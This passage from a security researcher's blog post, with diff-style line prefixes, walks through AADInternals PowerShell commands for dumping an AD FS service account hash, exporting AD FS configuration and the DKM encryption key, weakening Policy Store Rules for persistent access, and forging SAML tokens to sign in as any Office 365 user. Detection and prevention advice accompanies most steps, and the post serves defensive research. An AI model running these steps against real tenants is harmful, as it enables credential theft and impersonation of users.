+<h3 id="detecting-and-preventing-net-reflection">Detecting and preventing .NET reflection</h3>
+
+<p>As this technique is using legit AD FS management cmdlet, it practically can&rsquo;t be detected or prevented, but the limiting access to a minimum would reduce the attack surface.</p>
+
+<h2 id="remote-as-ad-fs-service-account">Remote as AD FS service account</h2>
+
+<p>Dumping the configuration remotely is a totally new functionality in AADInternals and it required a lot of refactoring of Kerberos related functionality :sweat_smile:</p>
+
+<p>The idea for this was given by my colleague <strong>Ryan Cobb</strong> from Secureworks a couple of weeks ago. After tweeting about this new finding, it turned out that, coincidentally, <strong>@doughsec</strong> had also
+researched the same technique a couple of months earlier. The report by <strong>@doughsec</strong> is available <a href="https://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html" target="_blank">here</a>,
+I&rsquo;ll post a detailed blog about my research process later.</p>
+
+<p>The basic idea here is to emulate the AD FS synchronisation by pretending to be the AD FS service:</p>
+
+<p><img src="/images/posts/ADFS_04.png" alt="AD FS sync" /></p>
+
+<p>It turned out that the &ldquo;AD FS sync&rdquo; is using SOAP for getting settings. The interesting part is that the whole process takes place using http (not https) and can therefore be monitored by using a proxy like Fiddler or Burp.
+However, the content of the SOAP messages are encrypted. I&rsquo;ll not dive into details in this blog, but the process involves Kerberos authentication and exchanging a bunch of encryption keys.</p>
+
+<p>I had earlier implemented functionality to create Kerberos tokens to exploit Seamless SSO. To get it to work with AD FS, I had to do some modifications, but that is also another story 😉</p>
+
+<p>Getting the configuration remotely requires a couple of things:</p>
+
+<ul>
+<li>Ip address or FQDN of <strong>any AD FS server</strong></li>
+<li>NTHash of the AD FS service user</li>
+<li>SID of the AD FS service user</li>
+</ul>
+
+<p>With the NTHash and SID, we can craft a Kerberos token and use it to authenticate against AD FS. After the authentication is completed, we can send an (encrypted) SOAP message to:</p>
+
+<pre><code>http://&lt;server&gt;/ADFS/services/policystoretransfer
+</code></pre>
+
+<p>The SOAP message would contain the following payload:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;GetState</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/ws/2009/12/identityserver/protocols/policystore&#34;</span><span class="nt">&gt;</span>
+	<span class="nt">&lt;serviceObjectType&gt;</span>ServiceSettings<span class="nt">&lt;/serviceObjectType&gt;</span>
+	<span class="nt">&lt;mask</span> <span class="na">xmlns:i=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
+	<span class="nt">&lt;filter</span> <span class="na">xmlns:i=</span><span class="s">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class="na">i:nil=</span><span class="s">&#34;true&#34;</span><span class="nt">/&gt;</span>
+	<span class="nt">&lt;clientVersionNumber&gt;</span>1<span class="nt">&lt;/clientVersionNumber&gt;</span>
+<span class="nt">&lt;/GetState&gt;</span></code></pre></div>
+
+<p>Getting the AD FS service user&rsquo;s NTHash would usually require tools like <a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz</a> or <a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank">DSInternals</a>.</p>
+
+<p>To make it easier for <strong>AADInternals</strong> users, I&rsquo;ve included a slighty modified <strong>DSInternals.Replication</strong> functionality which allows getting user information directly from Domain Controllers by emulating DCSync.</p>
+
+<p>First, we need to get the object guid of the AD FS service user. Below I&rsquo;m using sv_ADFS but that depends on your configuration.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="nb">Get-ADObject</span> <span class="n">-filter</span> <span class="p">*</span> <span class="n">-Properties</span> <span class="n">objectguid</span><span class="p">,</span><span class="n">objectsid</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="n">name</span> <span class="o">-eq</span> <span class="n">sv_ADFS</span> <span class="p">|</span> <span class="nb">Format-List</span> <span class="n">Name</span><span class="p">,</span><span class="n">ObjectGuid</span><span class="p">,</span><span class="n">ObjectSid</span></code></pre></div></p>
+
+<pre><code>Name       : sv_ADFS
+ObjectGuid : b6366885-73f0-4239-9cd9-4f44a0a7bc79
+ObjectSid  : S-1-5-21-1332519571-494820645-211741994-8710
+</code></pre>
+
+<p>Next, we can query the NTHash of the AD FS service user, which requires credentials having replication permissions.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Save credentials to a variable</span>
+<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+
+<span class="c"># Get the NTHash as hex string</span>
+<span class="nb">Get-AADIntADUserNTHash</span> <span class="n">-ObjectGuid</span> <span class="s2">&#34;b6366885-73f0-4239-9cd9-4f44a0a7bc79&#34;</span> <span class="n">-Credentials</span> <span class="nv">$creds</span> <span class="n">-Server</span> <span class="n">dc</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-AsHex</span></code></pre></div></p>
+
+<pre><code>6e36047d34057fbb8a4e0ce8933c73cf
+</code></pre>
+
+<p>Another option to get NTHash is to get AD FS service account&rsquo;s password from AD FS server (requires local admin rights):
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get NTHash of the AD FS service account</span>
+<span class="nb">Get-AADIntLSASecrets</span> <span class="n">-AccountName</span> <span class="n">sv_ADFS</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">-ExpandProperty</span> <span class="n">MD4Txt</span></code></pre></div></p>
+
+<pre><code>6e36047d34057fbb8a4e0ce8933c73cf
+</code></pre>
+
+<p>Finally, as we have all we need, we can get the configuration remotely:</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export configuration remotely and store to variable</span>
+<span class="nv">$ADFSConfig</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Hash</span> <span class="s2">&#34;6e36047d34057fbb8a4e0ce8933c73cf&#34;</span> <span class="n">-SID</span> <span class="s2">&#34;S-1-5-21-1332519571-494820645-211741994-8710&#34;</span> <span class="n">-Server</span> <span class="n">sts</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span></code></pre></div>
+
+<p><strong>Note!</strong> Getting configuration remotely <strong>works also when using the full SQL for storing the configuration data</strong>. In this scenario, there
+are no primary or secondary servers because all servers are using a centralised database.
+As such, <strong>there is no need for the AD FS sync and it should not be enabled at all</strong>!
+However, this how Microsoft designed AD FS, so there is nothing we can do about it 😞</p>
+
+<h3 id="detecting">Detecting</h3>
+
+<p>AD FS configuration sync is not logged to anywhere. However, enabling AD FS Tracing, will record <strong>event id 54</strong>, which indicates a succesful authentication:</p>
+
+<p><img src="/images/posts/ADFS_05.png" alt="AD FS tracing" /></p>
+
+<p>If the authentication timestamp is out of normal sync times, or from &ldquo;wrong&rdquo; computer, an alert should be raised.</p>
+
+<h3 id="preventing">Preventing</h3>
+
+<p>AD FS service requires that https traffic is allowed. Http traffic is only used by load balancers to probe whether the AD FS service is up or not:</p>
+
+<pre><code>http://&lt;server&gt;/ADFS/probe
+</code></pre>
+
+<p>As such, allowing http traffic only from other AD FS servers, proxies, and load balancers would reduce the attack surface.</p>
+
+<h2 id="remote-as-any-user">Remote as any user</h2>
+
+<p>Attackers may also <a href="#editing-policy-store-rules" target="_blank">alter the Policy Store Rules</a> to allow anyone to read the configuration.</p>
+
+<p><strong>AADInternals</strong> supports exporting the configuration remotely as the logged in user since v0.4.9.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export configuration remotely as a logged in user and store to variable</span>
+<span class="nv">$ADFSConfig</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSConfiguration</span> <span class="n">-Server</span> <span class="n">sts</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-AsLoggedInUser</span></code></pre></div>
+
+<h3 id="detecting-1">Detecting</h3>
+
+<p>For the AD FS servers, same detection techniques apply as above. However, now the user dumping configuration will first need to get Kerberos token from the DC.
+As such, we can monitor for any suspicious login activities.</p>
+
+<h3 id="preventing-1">Preventing</h3>
+
+<p>Blocking all http traffic (port 80) to AD FS servers would prevent exporting the configuration.</p>
+
+<h1 id="editing-policy-store-rules">Editing Policy Store Rules</h1>
+
+<p>Besides exporting the configuration, adversaries can also edit the configuration. This scenario requires a local admin rights to AD FS server, and that WID is used to store configuration data.</p>
+
+<p>The access to configuration data is limited by <strong>Policy Store Rules</strong>. The default rules are similar to following:</p>
+
+<pre><code>AuthorizationPolicyReadOnly : @RuleName = &quot;Permit Service Account&quot;
+							  exists([Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid&quot;, Value == &quot;S-1-5-21-2108354183-1066939247-874701363-3086&quot;])
+							   =&gt; issue(Type = &quot;http://schemas.microsoft.com/authorization/claims/permit&quot;, Value = &quot;true&quot;);
+
+							  @RuleName = &quot;Permit Local Administrators&quot;
+							  exists([Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid&quot;, Value == &quot;S-1-5-32-544&quot;])
+							   =&gt; issue(Type = &quot;http://schemas.microsoft.com/authorization/claims/permit&quot;, Value = &quot;true&quot;);
+
+AuthorizationPolicy         : @RuleName = &quot;Permit Service Account&quot;
+							  exists([Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/primarysid&quot;, Value == &quot;S-1-5-21-2108354183-1066939247-874701363-3086&quot;])
+							   =&gt; issue(Type = &quot;http://schemas.microsoft.com/authorization/claims/permit&quot;, Value = &quot;true&quot;);
+
+							  @RuleName = &quot;Permit Local Administrators&quot;
+							  exists([Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/groupsid&quot;, Value == &quot;S-1-5-32-544&quot;])
+							   =&gt; issue(Type = &quot;http://schemas.microsoft.com/authorization/claims/permit&quot;, Value = &quot;true&quot;);
+
+</code></pre>
+
+<p>As we can see, there are two rules: one for Read-Write permissions and one for Read-Only permission. The rules are defined using <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ad-fs-2-0-claims-rule-language-primer/ba-p/399789" target="_blank">AD FS Claims Rule Language</a>.
+As such, we can define as complex rules for giving permissions as we want to. The default rules are assigning RW permissions to the Local Administrators (group) and to AD FS service user (user or gMSA).</p>
+
+<p>During the initial attack/compromise, adversaries often would like to have more persistent access to the configuration data. The easiest way to achieve this is to allow read permissions to all users. <strong>AADInternals</strong> supports editing the Policy Store Rules since v0.4.8.</p>
+
+<p>Technically, the export is edited by executing a SQL query against the WID:</p>
+
+<p><img src="/images/posts/ADFS_02.png" alt="AD FS with WID" /></p>
+
+<p>The following script will change the Read-Only permission so that anyone can get the configuration - RW permissions remain intact.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get Policy Store Authorisation Policy rules from the local AD FS</span>
+<span class="nv">$authPolicy</span> <span class="p">=</span> <span class="nb">Get-AADIntADFSPolicyStoreRules</span>
+
+<span class="c"># Get the configuration from the local AD FS server and set read-only policy to allow all to read</span>
+<span class="nv">$config</span> <span class="p">=</span> <span class="nb">Set-AADIntADFSPolicyStoreRules</span> <span class="n">-AuthorizationPolicy</span> <span class="nv">$authPolicy</span><span class="p">.</span><span class="n">AuthorizationPolicy</span>
+
+<span class="c"># Set the configuration to the local AD FS database</span>
+<span class="nb">Set-AADIntADFSConfiguration</span> <span class="n">-Configuration</span> <span class="nv">$config</span></code></pre></div></p>
+
+<p>The resulting rule for AuthorizationPolicyReadOnly:</p>
+
+<pre><code>=&gt; issue(Type = &quot;http://schemas.microsoft.com/authorization/claims/permit&quot;, Value = &quot;true&quot;);
+</code></pre>
+
+<p>As a result, exporting AD FS configuration remotely doesn&rsquo;t require Local Admin permissions on the AD FS server or AD FS service account credentials/hash. Any use who can log in to the domain (or AD FS server) can now export the configuration remotely.</p>
+
+<h2 id="detecting-2">Detecting</h2>
+
+<p>Detection happens in a similar manner than in exporting the local configuration. The following SQL query will enable logging for all UPDATE statements against ServiceSettings table.</p>
+
+<div class="highlight"><pre class="chroma"><code class="language-sql" data-lang="sql"><span class="n">USE</span> <span class="p">[</span><span class="n">master</span><span class="p">]</span>
+<span class="k">GO</span>
+<span class="k">CREATE</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_UPDATE_LOG</span><span class="p">]</span> <span class="k">TO</span> <span class="n">APPLICATION_LOG</span> <span class="k">WITH</span> <span class="p">(</span><span class="n">QUEUE_DELAY</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">,</span> <span class="n">ON_FAILURE</span> <span class="o">=</span> <span class="k">CONTINUE</span><span class="p">)</span>
+<span class="k">GO</span>
+<span class="k">ALTER</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_UPDATE_LOG</span><span class="p">]</span> <span class="k">WITH</span> <span class="p">(</span><span class="k">STATE</span> <span class="o">=</span> <span class="k">ON</span><span class="p">)</span>
+<span class="k">GO</span>
+<span class="n">USE</span> <span class="p">[</span><span class="n">ADFSConfigurationV4</span><span class="p">]</span>
+<span class="k">GO</span>
+<span class="k">CREATE</span> <span class="k">DATABASE</span> <span class="n">AUDIT</span> <span class="n">SPECIFICATION</span> <span class="p">[</span><span class="n">ADFS_SETTINGS_UPDATE_AUDIT</span><span class="p">]</span> <span class="k">FOR</span> <span class="n">SERVER</span> <span class="n">AUDIT</span> <span class="p">[</span><span class="n">ADFS_AUDIT_APPLICATION_UPDATE_LOG</span><span class="p">]</span> <span class="k">ADD</span> <span class="p">(</span><span class="k">UPDATE</span> <span class="k">ON</span> <span class="k">OBJECT</span><span class="p">::[</span><span class="n">IdentityServerPolicy</span><span class="p">].[</span><span class="n">ServiceSettings</span><span class="p">]</span> <span class="k">BY</span> <span class="p">[</span><span class="k">public</span><span class="p">])</span>
+<span class="k">GO</span>
+<span class="k">ALTER</span> <span class="k">DATABASE</span> <span class="n">AUDIT</span> <span class="n">SPECIFICATION</span> <span class="p">[</span><span class="n">ADFS_SETTINGS_UPDATE_AUDIT</span><span class="p">]</span> <span class="k">WITH</span> <span class="p">(</span><span class="k">STATE</span> <span class="o">=</span> <span class="k">ON</span><span class="p">)</span>
+<span class="k">GO</span></code></pre></div>
+
+<p>Now all edit events are logged to the Application log:</p>
+
+<p><img src="/images/posts/ADFS_11.png" alt="AD FS with WID" /></p>
+
+<h2 id="preventing-2">Preventing</h2>
+
+<p>Editing database locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.</p>
+
+<h1 id="exporting-configuration-encryption-key">Exporting configuration encryption key</h1>
+
+<p>AD FS is using Distributed Key Manager (DKM) container to store the configuration encryption key in Active Directory. Container location is included in the configuration xml (lines 69 and 70).</p>
+
+<p>Inside the container there are one or more &ldquo;Groups&rdquo;. The correct group is also included in the configuration xml (line 68). Inside the group, there are two (or more) contact objects.
+One of those objects is always named to &ldquo;CryptoPolicy&rdquo; and its <strong>DisplayName</strong> attribute is a GUID. The encryption key is located in the object, which has an &ldquo;<strong>l</strong>&rdquo; (location) attribute value matching
+the <strong>DisplayName of the CryptoPolicy object</strong>.</p>
+
+<p><img src="/images/posts/ADFS_06.png" alt="AD FS encryption key" /></p>
+
+<h2 id="local-net-reflection">Local (.NET reflection)</h2>
+
+<p>The local export here refers to export taking place on AD FS server. This technique is also using .NET reflection as introduced in <a href="https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor" target="_blank">FoggyWeb</a>:</p>
+
+<p><img src="/images/posts/ADFS_15.png" alt="FoggyWeb" /></p>
+
+<p>The basic idea here is to use AD FS binaries to get the key for you, making it extremely stealthy.</p>
+
+<p>However, the code must be run as AD FS service account. Long story short, I solved this challenge by running a custom made service as AD FS service account.</p>
+
+<p><img src="/images/posts/ADFS_14.png" alt="export using service" /></p>
+
+<p>After the service is started, it will listen a named pipe to get configuration sent by AADInternals. After receiving the configuration, the service
+will use .NET reflection to get the DKM key from AD and returns it to AADInternals via named pipe. Source code of the service available in <a href="https://github.com/Gerenios/public/blob/master/KDFDumpService.cs" target="_blank">github</a>.</p>
+
+<p>To export the key with AADInternals:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export encryption key and store to variable</span>
+<span class="nv">$ADFSKey</span> <span class="p">=</span> <span class="nb">Export-AADIntEncryptionKey</span> <span class="n">-Local</span> <span class="n">-Configuration</span> <span class="nv">$ADFSConfig</span></code></pre></div></p>
+
+<h3 id="detecting-3">Detecting</h3>
+
+<p>Detecting the encryption key export is based on enabling auditing the access to AD FS DKM container.
+For instance, Roberto Rodriguez (<a href="https://twitter.com/Cyb3rWard0g/" target="_blank">@Cyb3rWard0g</a>) has published a great <a href="https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html" target="_blank">article</a>
+on how to enable auditing.</p>
+
+<p>However, as this technique is using AD FS binaries as AD FS service account to access DKM container, it is in practice undetectable.</p>
+
+<p>On AD FS server, the service used to get the key is present for a very brief time:
+<img src="/images/posts/ADFS_16.png" alt="aadinternals service" /></p>
+
+<p>Monitoring creation of new services, especially those running as AD FS service account, helps to detect execution of this technique.</p>
+
+<h3 id="preventing-3">Preventing</h3>
+
+<p>Exporting the encryption key locally can not be fully prevented, but the limiting access to a minimum would reduce the attack surface.</p>
+
+<h2 id="remote">Remote</h2>
+
+<p>Exporting the encryption key remotely is using DCSync. As such, the credentials with directory replication rights are needed, but the actual export can be performed from any computer.
+Also the object guid of the DKM object is needed.</p>
+
+<p><img src="/images/posts/ADFS_09.png" alt="remote encryption key export" /></p>
+
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Save credentials to a variable</span>
+<span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Get-Credential</span>
+
+<span class="c"># Export encryption key remotely and store to variable</span>
+<span class="nv">$ADFSKey</span> <span class="p">=</span> <span class="nb">Export-AADIntADFSEncryptionKey</span> <span class="n">-Server</span> <span class="n">dc</span><span class="p">.</span><span class="n">company</span><span class="p">.</span><span class="n">com</span> <span class="n">-Credentials</span> <span class="nv">$cred</span> <span class="n">-ObjectGuid</span> <span class="s2">&#34;930e004a-4486-4f58-aead-268e41c0531e&#34;</span></code></pre></div>
+
+<h3 id="detecting-4">Detecting</h3>
+
+<p>Technically, the encryption key is fetched using DCSync. As such, it will generate <strong>event id 4662</strong> to Security log. However, the access to DKM container is NOT detected.</p>
+
+<p><img src="/images/posts/ADFS_10.png" alt="detecting remote key export" /></p>
+
+<h3 id="preventing-4">Preventing</h3>
+
+<p>In practice, exporting the encryption key remotely can not prevented, but limiting the replication rights would reduce the attack surface.</p>
+
+<h1 id="exporting-ad-fs-certificates">Exporting AD FS certificates</h1>
+
+<p>After exporting the configuration and encryption key, we are ready to decrypt the AD FS certificates. As we can see from the configuration xml, it includes certificates for Signing Token (line 42) and Encryption Token (line 32).
+Also &ldquo;additional&rdquo; certificates for signing token (line 21) and encryption token (line 9) are included. These additional certificates are (usually) generated automatically, when the currently used
+certificates getting near their expiration date. If the additional certificates are same than &ldquo;current&rdquo; certificates, they are not exported.</p>
+
+<p>To export AD FS certificates to the current directory:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export AD FS certificates</span>
+<span class="nb">Export-AADIntADFSCertificates</span> <span class="n">-Configuration</span> <span class="nv">$ADFSConfig</span> <span class="n">-Key</span> <span class="nv">$ADFSKey</span></code></pre></div></p>
+
+<p>If you are running this on AD FS server, you can omit the parameters:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Export AD FS certificates on AD FS server</span>
+<span class="nb">Export-AADIntADFSCertificates</span></code></pre></div></p>
+
+<h1 id="exploiting">Exploiting</h1>
+
+<p>To exploit the Azure AD with the exported AD FS signing certificates, we need to know:</p>
+
+<ul>
+<li>The issuer URI of the AD FS service</li>
+<li>ImmutableId of the user we want to login as</li>
+</ul>
+
+<p>First, lets get the issuer URI. It can be fetched from the Azure AD or from the AD FS server.</p>
+
+<p>To get the issuer URI from Azure AD using MsOnline PS module:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the issuer URI</span>
+<span class="nv">$Issuer</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-MsolDomainFederationSettings</span> <span class="n">-DomainName</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;).</span><span class="n">IssuerUri</span></code></pre></div></p>
+
+<p>To get the issuer URI from the AD FS server:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get the issuer URI</span>
+<span class="nv">$Issuer</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ADFSProperties</span><span class="p">).</span><span class="n">Identifier</span><span class="p">.</span><span class="n">OriginalString</span></code></pre></div></p>
+
+<p><strong>Note:</strong> If AD FS is configured using Azure AD Connect, the OriginalString may NOT equal to issuer uri registered to Azure AD!</p>
+
+<p>Next, we need the ImmutableId of the user we want to logon as. The ImmutableId can also be fetched from the Azure AD or from on-prem AD (ImmutableId is Base64 encoded ObjectGuid of the user&rsquo;s on-prem AD account).</p>
+
+<p>To get users and immutable id&rsquo;s from Azure AD using MsOnline PS module:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get ImmutableIds</span>
+<span class="nb">Get-MsolUser</span> <span class="p">|</span> <span class="n">select</span> <span class="n">UserPrincipalName</span><span class="p">,</span><span class="n">ImmutableId</span></code></pre></div></p>
+
+<p>To get users and immutable id&rsquo;s from on-prem AD using AzureAD PS module:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get ImmutableIds</span>
+<span class="nb">Get-ADUser</span> <span class="n">-Filter</span> <span class="p">*</span> <span class="p">|</span> <span class="n">select</span> <span class="n">UserPrincipalname</span><span class="p">,@{</span><span class="n">Name</span> <span class="p">=</span> <span class="s2">&#34;ImmutableId&#34;</span> <span class="p">;</span> <span class="n">Expression</span> <span class="p">=</span> <span class="p">{</span> <span class="s2">&#34;</span><span class="p">$(</span><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">((</span><span class="no">[guid]</span><span class="nv">$_</span><span class="p">.</span><span class="n">ObjectGuid</span><span class="p">).</span><span class="n">ToByteArray</span><span class="p">()))</span><span class="s2"> &#34;</span><span class="p">}}</span></code></pre></div></p>
+
+<pre><code>UserPrincipalname    ImmutableId              
+-----------------    -----------              
+AlexW@company.com    Ryo4MuvXW0muelHOefJ9yg== 
+AllanD@company.com   Eo+jOAQegUi6rEy8+Yu1Rg== 
+DiegoS@company.com   cl/bTG5zJku9VynOaXYaeQ== 
+IsaiahL@company.com  iZaESRicxECDk5bN7gZhPg== 
+JoniS@company.com    iGyyi+gq40u409PXjE3yRg== 
+LynneR@company.com   QpHd34ay4UKo0whX6hui3g== 
+MeganB@company.com   31YCEbfrMUCefem7zlPYTg== 
+NestorW@company.com  jyEyYWLzKkSpq3bERRG+PQ== 
+PattiF@company.com   xTuqzBwFbUePyPGRRA1R4g== 
+SamiL@company.com    VlUqJm8rrUeAhrhJGIhYsQ== 
+MarkR@company.com    J1OAD14fgEWTMjLqQL5+/g== 
+</code></pre>
+
+<p>Now we can login as any user whose ImmutableId is known. The following command will open a Chrome browser and log the user automatically in.
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Open Office 365 portal as the given user</span>
+<span class="n">Open-AADIntOffice365Portal</span> <span class="n">-ImmutableID</span> <span class="n">iZaESRicxECDk5bN7gZhPg</span><span class="p">==</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">ADFS_signing</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Issuer</span> <span class="nv">$Issuer</span> <span class="n">-Browser</span> <span class="n">Chrome</span></code></pre></div></p>
+
+<p>We can also use the same information to get access token to any Office 365/Azure AD service we like:
+<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create a SAML token</span>
+<span class="nv">$saml</span> <span class="p">=</span> <span class="nb">New-AADIntSAMLToken</span> <span class="n">-ImmutableID</span> <span class="n">iZaESRicxECDk5bN7gZhPg</span><span class="p">==</span> <span class="n">-PfxFileName</span> <span class="p">.\</span><span class="n">ADFS_signing</span><span class="p">.</span><span class="n">pfx</span> <span class="n">-Issuer</span> <span class="nv">$Issuer</span>
+
+<span class="c"># Get access token for Outlook</span>
+<span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-SAMLToken</span> <span class="nv">$saml</span> <span class="n">-SaveToCache</span></code></pre></div></p>
+
+<pre><code>Tenant                               User                Resource                      Client                              
+------                               ----                --------                      ------                              
+112d9bdc-b677-4a5f-8650-2948dbedb02f IsaiahL@company.com https://outlook.office365.com d3590ed6-52b3-4102-aeff-aad2292ab01c
+</code></pre>
+
+<h1 id="summary">Summary</h1>
+
+<p>In this blog post, I introduced various techniques how to export AD FS configuration data and encryption key to extract the AD FS certificates. Corresponding detection and prevention
+techniques were also introduced.</p>
+
+<h1 id="references">References</h1>
+
+<ul>
+<li>Douglas Bienstock and Austin Baker: <a href="https://www.slideshare.net/DouglasBienstock/troopers-19-i-am-ad-fs-and-so-can-you" target="_blank">I am AD FS and So Can You</a></li>
+<li>Fireeye: <a href="https://github.com/fireeye/ADFSdump" target="_blank">ADFSDump</a></li>
+<li>Fireeye: <a href="https://github.com/fireeye/ADFSpoof" target="_blank">ADFSpoof</a></li>
+<li>Microsoft: <a href="https://github.com/microsoft/adfsToolbox" target="_blank">ADFSToolbox</a>, <a href="https://github.com/Microsoft/adfsToolbox/blob/master/serviceAccountModule/Tests/Test.ServiceAccount.ps1#L199-L208">Test.ServiceAccount.ps1</a></li>
+<li>Douglas Bienstock / Fireeye: <a href="https://www.fireeye.com/blog/threat-research/2021/04/abusing-replication-stealing-adfs-secrets-over-the-network.html" target="_blank">Abusing Replication: Stealing AD FS Secrets Over the Network</a></li>
+<li>Dirk-Jan Mollena: <a href="https://github.com/fox-it/adconnectdump" target="_blank">adconnectdump</a></li>
+<li>Benjamin Delby: <a href="https://github.com/gentilkiwi/mimikatz/wiki" target="_blank">Mimikatz</a></li>
+<li>Michael Grafnetter: <a href="https://github.com/MichaelGrafnetter/DSInternals" target="_blank">DSInternals</a></li>
+<li>Microsoft: <a href="https://www.microsoft.com/security/blog/2021/09/27/foggyweb-targeted-nobelium-malware-leads-to-persistent-backdoor" target="_blank">FoggyWeb: Targeted NOBELIUM malware leads to persistent backdoor</a></li>
+<li>Roberto Rodriquez: <a href="https://threathunterplaybook.com/library/windows/adfs_dkm_keys.html" target="_blank">Threat Hunter Playbook: Active Directory Federation Services (ADFS) Distributed Key Manager (DKM) Keys</a></li>
+<li>Ned Pyle (Microsoft): <a href="https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/ad-fs-2-0-claims-rule-language-primer/ba-p/399789" target="_blank">AD FS 2.0 Claims Rule Language Primer</a></li>
+</ul>
+		</div>
+		
+<div class="post__tags tags clearfix">
+	<img class="icon icon-tag" src="/images/tags.png" width="16" height="16" viewBox="0 0 16 16">
+	
+	<ul class="tags__list">
+		<li class="tags__item"><a class="tags__link" href="/tags/azure-active-directory/" rel="tag">Azure Active Directory</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/azure/" rel="tag">Azure</a></li>
+		<li class="tags__item"><a class="tags__link" href="/tags/adfs/" rel="tag">ADFS</a></li>
+	</ul>
+</div>
+
+		<div class="post__tags tags clearfix">
+<ul class="tags__list">
+	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fadfs%2f&text=Exporting%20AD%20FS%20certificates%20revisited%3a%20Tactics%2c%20Techniques%20and%20Procedures&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fadfs%2f&mini=true&title=Exporting%20AD%20FS%20certificates%20revisited%3a%20Tactics%2c%20Techniques%20and%20Procedures&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
+</ul>
+</div>
+	</article>
+	
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="Dr Nestori Syynimaa (@DrAzureAD) avatar" src="/images/nestori.jpg" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About Dr Nestori Syynimaa (@DrAzureAD)</span>
+	</div>
+	<div class="authorbox__description">
+		Dr Syynimaa works as Senior Principal Information Security Researcher at Secureworks CTU (Counter Threat Unit). <br> Before moving to his current position, Dr Syynimaa worked as a CIO, consultant, trainer, and university lecturer for over 20 years. He is a regular speaker in scientific and professional conferences related to Microsoft 365 and Azure AD security. <br><br>Dr Syynimaa is Microsoft Certified Expert (Microsoft 365), Microsoft Certified Azure Solutions Architect Expert, Microsoft Certified Trainer, Microsoft MVP (Enterprise Mobility, Identity and Access &amp; Intune), and Microsoft Most Valuable Security Researcher (MVR).
+	</div>
+</div>
+	
+<nav class="post-nav row clearfix" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
+	<div class="post-nav__item post-nav__item--prev col-1-2">
